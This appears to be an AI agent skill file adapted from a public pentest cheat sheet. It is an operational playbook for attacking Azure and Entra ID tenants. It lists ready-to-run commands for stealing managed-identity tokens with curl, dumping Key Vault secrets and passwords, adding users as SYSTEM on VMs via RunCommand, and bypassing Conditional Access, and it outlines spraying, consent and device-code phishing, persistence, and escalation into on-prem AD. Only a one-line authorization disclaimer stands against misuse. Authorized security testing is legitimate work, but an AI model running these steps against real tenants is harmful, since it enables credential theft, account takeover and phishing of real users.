---
name: azure-entra-security
description: >-
  Assess and attack Microsoft Azure and Entra ID (Azure AD): token and refresh-token abuse,
  enumeration with AzureHound/ROADtools, IAM objects (users, devices, service principals, managed
  identities), Conditional Access bypass, AD Connect and cloud sync, Key Vault, Runbooks, Intune,
  Storage Blob, Web Apps, Container Registry, Azure DevOps, Office 365 phishing and persistence,
  and aka.ms shortcuts. Use when an engagement includes Azure or Entra ID, when you hold a token
  or credentials, or when reviewing cloud tenant configuration.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "22"
  generated-by: build/build.py
---

# Azure and Entra ID Security

Azure compromises are token compromises. An Entra ID token (access, refresh, FOCI refresh, PRT) is portable across every service in the tenant and scoped by audience, not by tool, so the first question is what token you hold and for which resource. The second is what that identity reaches: subscription RBAC, Key Vault, a VM's RunCommand, or the on-prem AD behind AD Connect. Done means tenant ID, identity with its roles, the resources it can act on, and how the token is re-minted.

## When to use this skill

- Azure or Entra ID is in scope and you hold any of: credential pair, access token, refresh token, PRT, `ESTSAuth` cookie, service-principal secret/certificate, or a FOCI family token.
- You landed on an Azure-hosted workload (App Service, Function, VM, container) with `IDENTITY_ENDPOINT`/`IDENTITY_HEADER` in the environment.
- You have an on-prem foothold where `Get-ADSyncConnector` returns something - the cloud is one credential away.
- You are reviewing tenant configuration: CAP gaps, consent policy, role assignments, exposed storage or Key Vault.
- Not this skill: AWS → `aws-security`; container escape → `container-security`; CI pipeline secrets → `cicd-supply-chain-security`; the on-prem credentials that feed the cloud → `active-directory-credentials`; on-prem MSSQL → `mssql-security`.

## First moves

1. Establish who you are; the token's `aud` decides which API you can call.

```bash
az login -u <username> -p '<password>'
az login --service-principal -u <app-id> -p '<secret>' --tenant <tenant-id>
az account get-access-token --resource-type aad-graph
az ad signed-in-user show
```

2. On a workload with a managed identity, the environment variables are the credential source. `MSI_ENDPOINT`/`MSI_SECRET` are aliases for `IDENTITY_ENDPOINT`/`IDENTITY_HEADER`.

```bash
env | grep -i identity
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

3. Build the offline graph once - `roadrecon` stores everything in a local SQL database:

```bash
roadrecon auth --access-token eyJ0eXA...
roadrecon gather
roadrecon gui
roadrecon plugin policies          # Conditional Access, from the local DB
```

4. Secrets are the usual objective. A `vault.azure.net` token is separate from the ARM and Graph tokens:

```powershell
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName <VaultName> -Name <SecretName> -AsPlainText
Connect-AzAccount -AccessToken $armtoken -AccountId $accid -KeyVaultAccessToken $keyvaulttoken
Import-Module Microburst.psm1; Get-AzurePasswords     # automations, app services, key vaults
```

5. Contributor on a subscription is local SYSTEM on every VM in it - `Microsoft.Compute/virtualMachines/runCommand/action` is the only requirement:

```powershell
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
```

6. Check what Conditional Access enforces, then try the Intune Company Portal client ID - a hardcoded device-compliance exclusion:

```bash
roadtx gettokens -u $username -p $password -r msgraph -ua "$windows_ua" -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223
roadtx gettokens -u $username -p $password -r aadgraph -ua "$windows_ua" -c 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223
```

## Reference map

**Identity core, in reading order**

| Reference | Read it when | Key content |
|---|---|---|
| [azure-requirements.md](references/azure-requirements.md) | scoping | reader roles, modules, terminology |
| [azure-access-and-token.md](references/azure-access-and-token.md) | holding a token, cookie or secret | login paths, device code, IMDS, on-disk tokens, FOCI/PRT |
| [azure-enumeration.md](references/azure-enumeration.md) | first tenant recon | roadrecon/AzureHound/GraphRunner, user enum, spraying, services |
| [azure-iam.md](references/azure-iam.md) | identity objects | dynamic groups, Admin Units, devices, BitLocker keys, SPs |
| [conditional-access-policy.md](references/conditional-access-policy.md) | a token or login is blocked | bypass table, Intune client ID, fake compliance, UA/location |
| [ad-connect-cloud-sync.md](references/ad-connect-cloud-sync.md) | an AD Connect or PTA host is compromised | PHS extraction, PTA spy, adconnectdump, MSOL→DCSync |
| [azure-phishing.md](references/azure-phishing.md) | you need consent or a session | consent grant, device-code phish, Evilginx2, Power Platform |
| [azure-persistence.md](references/azure-persistence.md) | after privilege | app secret, SP password, group add, KFM profile |

**Azure services, jump to the one you saw**

| Reference | Read it when | Key content |
|---|---|---|
| [keyvault.md](references/keyvault.md) | `*.vault.azure.net` or a vault token | token curl, `-AsPlainText`, `Get-AzurePasswords` |
| [storage-blob.md](references/storage-blob.md) | `*.blob/file/table/queue.core.windows.net` | endpoint enum, `comp=list`, versions, public access, SAS |
| [virtual-machine.md](references/virtual-machine.md) | Contributor with VMs | RunCommand as SYSTEM, bulk command, public IP |
| [web-apps.md](references/web-apps.md) | App Service or `*.scm.azurewebsites.net` | `az webapp list`, Kudu, shell command, remote connection |
| [container-registry.md](references/container-registry.md) | `*.azurecr.io` or `az acr` rights | `--expose-token`, `repository list/show-tags`, docker pull |
| [runbook-automation.md](references/runbook-automation.md) | an Automation Account exists | import/publish/start runbook, credentials, webhooks, DSC |
| [intune.md](references/intune.md) | `endpoint.microsoft.com` or Intune roles | script push, `Get-DeviceManagementScripts`, LAPS |
| [azure-devops.md](references/azure-devops.md) | `dev.azure.com` or a PAT/cookie | PAT/cookie auth, ADOKit, pipeline secrets, service connections |
| [application-proxy.md](references/application-proxy.md) | an internal app is published | proxy app enumeration, assigned users/groups |
| [application-endpoint.md](references/application-endpoint.md) | you need an app login URL | `ReplyUrls` filters, `myapps` signin URL |
| [deployment-template.md](references/deployment-template.md) | ARM deployments are readable | export template, grep JSON for passwords |
| [office-365.md](references/office-365.md) | mail, Teams or OneDrive is the objective | Teams messages, `Get-MgUserMessage`, drives |

**Lookup tables**

| Reference | Read it when | Key content |
|---|---|---|
| [dns-suffix-domains.md](references/dns-suffix-domains.md) | a hostname needs identifying | Azure service suffixes by category, sovereign clouds |
| [aka-ms-shortcuts.md](references/aka-ms-shortcuts.md) | you need the right portal fast | Entra blades, admin portals, Intune, Defender |

## Workflow

1. **Classify the entry point.** Credential pair → step 2. Token → decode at `jwt.ms`, note `aud`/`roles`/`scp`. Refresh token → `roadtx gettokens --refresh-token <rt> -c <foci-id>`, because FOCI tokens exchange across clients. PRT/`ESTSAuth` or on-host identity → `azure-access-and-token.md`.
2. **Authenticate and enumerate.** `roadrecon auth/gather` then `azurehound list`, plus GraphRunner `Invoke-DumpCAPS`/`Invoke-DumpApps`; then `azure-iam.md` for users, groups, service principals, devices.
3. **Find what the identity can modify.** A dynamic group whose rule matches a property you control (`otherMails`, `userType`) → add yourself. `HiddenMembership` Administrative Unit → persistence. Global Administrator → application credentials.
4. **Blocked by policy?** `conditional-access-policy.md` maps CAP type to bypass: location → VPN/guest wifi, platform → user-agent switch, protocol → POP/IMAP/SMTP, AAD-joined → join a VM, compliant device → Intune client ID or fake compliance. Enumerate offline, not by probing.
5. **Route by what you saw**, then escalate: Key Vault secret → AD Connect/SP credential → subscription Contributor → RunCommand or Runbook as SYSTEM → on-prem via a domain-joined host. Cross the boundary with `ad-connect-cloud-sync.md`, persist per `azure-persistence.md`.

## Gotchas

- Audience scoping is the usual dead end: Graph tokens cannot call `management.azure.com`, and neither reads Key Vault. Each resource needs its own token - `graph.microsoft.com`, `management.azure.com`, `vault.azure.net`, `storage.azure.com`.
- `az cli` stores access tokens in cleartext in `accessTokens.json` and `ServicePrincipalSecret` in `AzureRmContext.json` under `C:\Users\<user>\.Azure`.
- A PRT is valid 90 days in continuous use, 14 days idle; TPM-backed extraction has no known method.
- A Runbook must be saved **and** published before it runs; Contributor or higher can create and run them, and `-RunOn <worker group>` decides whether it executes in Azure or on-prem.
- `AZUREADSSOACC$`'s password never changes, so a seamless-SSO silver ticket survives until rotation - but it only impersonates users without MFA.
- Illicit consent is largely closed: publisher verification blocks unverified multi-tenant apps created after 8 Nov 2020. Check `(GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole` first; device-code phishing needs no consent.
- O365 lockout is 10 failed attempts then 60 seconds; spraying tools must be told the limit (`--lockout`, `--count`).
- AD Connect credentials sit in `ADSync.mdf`; `ADSyncQuery` needs local MSSQL LocalDB, `ADSyncGather` needs Python on the host, `ADSyncDecrypt` needs the AD Connect DLLs.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Token replay and consent phishing against real users need written authorization.

## Source

Converted from the upstream InternalAllTheThings Azure guides (https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
